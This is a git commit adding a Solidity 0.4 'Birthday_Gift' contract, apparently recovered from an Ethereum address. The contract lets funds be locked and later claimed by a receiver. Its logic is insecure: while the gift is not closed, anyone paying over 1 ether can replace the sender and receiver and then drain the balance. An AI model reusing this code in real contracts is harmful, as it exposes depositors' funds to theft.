9e46b1c0fe47f3ac718ed5b1a19e3096f73297b9
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 00:10:16 +0700

    add contract Birthday_Gift

---
+++ Birthday_Gift.sol
@@ -0,0 +1,57 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Birthday_Gift at 0x930DfbDc5E9f1984A8d87DE29d6A79FBb2bB7B32
+*/
+pragma solidity ^0.4.19;
+
+contract Birthday_Gift
+{
+    address sender;
+    
+    address reciver;
+    
+    bool closed = false;
+    
+    uint unlockTime;
+ 
+    function PutGift(address _reciver)
+    public
+    payable
+    {
+        if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )
+        {
+            sender = msg.sender;
+            reciver = _reciver;
+            unlockTime = now;
+        }
+    }
+    
+    function SetGiftTime(uint _unixTime)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            unlockTime = _unixTime;
+        }
+    }
+    
+    function GetGift()
+    public
+    payable
+    {
+        if(reciver==msg.sender&&now>unlockTime)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function CloseGift()
+    public
+    {
+        if(sender == msg.sender && reciver != 0x0 )
+        {
+           closed=true;
+        }
+    }
+    
+    function() public payable{}
+}
